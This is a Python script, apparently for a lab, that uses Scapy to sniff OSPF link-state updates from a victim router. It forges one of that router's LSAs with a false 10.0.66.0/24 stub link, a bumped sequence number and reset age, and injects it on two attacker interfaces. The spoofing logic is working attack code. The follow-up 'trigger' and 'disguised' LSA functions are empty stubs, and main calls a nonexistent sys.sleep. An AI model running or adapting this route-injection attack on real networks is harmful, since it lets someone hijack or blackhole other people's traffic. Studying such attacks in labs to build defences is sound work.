#!/usr/bin/env python

import termcolor as T # grey red green yellow blue magenta cyan white
import os
import sys
import ctypes
import datetime
import copy

from subprocess import Popen, PIPE
from scapy.all import *
from random import randint
from time import sleep


load_contrib("ospf")


IFACES = ['atk1-eth0', 'atk1-eth1']
DESTINATION_MAC_ADDRESS = '01:00:5e:00:00:05'
VICTIM_ROUTER = '4.4.4.4'
SEND_INTERVAL = 1


sent = 0


def log(s, col="green"):
	print T.colored(s, col)


def alterate_lsa(lsa):
	false_link = None

	for link in lsa.linklist:
		
		if link.type == 3: # stub
			false_link = copy.deepcopy(link)

			false_link.id = '10.0.66.0'
			false_link.data = '255.255.255.0'

			lsa.linklist.append(false_link)
			lsa.linkcount = lsa.linkcount + 1			

			return


def create_trigger_frame(frame, lsa):
	ip_packet = frame.getlayer(IP)
	ip_packet.id = ip_packet.id + 1
	ip_packet.len = None
	ip_packet.chksum = None

	lsa.seq = lsa.seq + 1
	lsa.age = 0
	lsa.len = None
	lsa.chksum = None
	
	ospf_packet = ip_packet.payload
	ospf_packet.len = None
	ospf_packet.chksum = None

	ospf_packet[OSPF_Hdr].lsalist = []
	ospf_packet[OSPF_Hdr].lsalist.append(lsa)
	ospf_packet[OSPF_Hdr].lsacount = 1

	alterate_lsa(lsa)

	frame.show2()

	return frame


def frame_callback(frame):
	now = datetime.datetime.now()

	global sent

	if sent == 0 and frame.getlayer(IP) and frame.getlayer(IP).proto == 89: # OSPF

		ospf_packet = frame.getlayer(IP).payload

		if ospf_packet.type == 4: # LS Update
			for lsa in ospf_packet[OSPF_Hdr].lsalist:
				if lsa.adrouter == VICTIM_ROUTER:
					trigger_frame = create_trigger_frame(frame, lsa)

					for i in IFACES:
						print 'sending on %s' % i

						sendp(trigger_frame, iface=i)

						sent = 1

					sys.stdout.flush()


def capture_ospf_messages():
	sniff(prn=frame_callback, filter='ip', store=0)
	

def send_trigger_lsa():
	print 'send_trigger_lsa()'

	pass


def send_disguised_lsa():
	print 'send_disguised_lsa()'

	pass


def main():
	capture_ospf_messages()

	send_trigger_lsa()

	sys.sleep(SEND_INTERVAL)

	send_disguised_lsa()


if __name__ == "__main__":
	main()

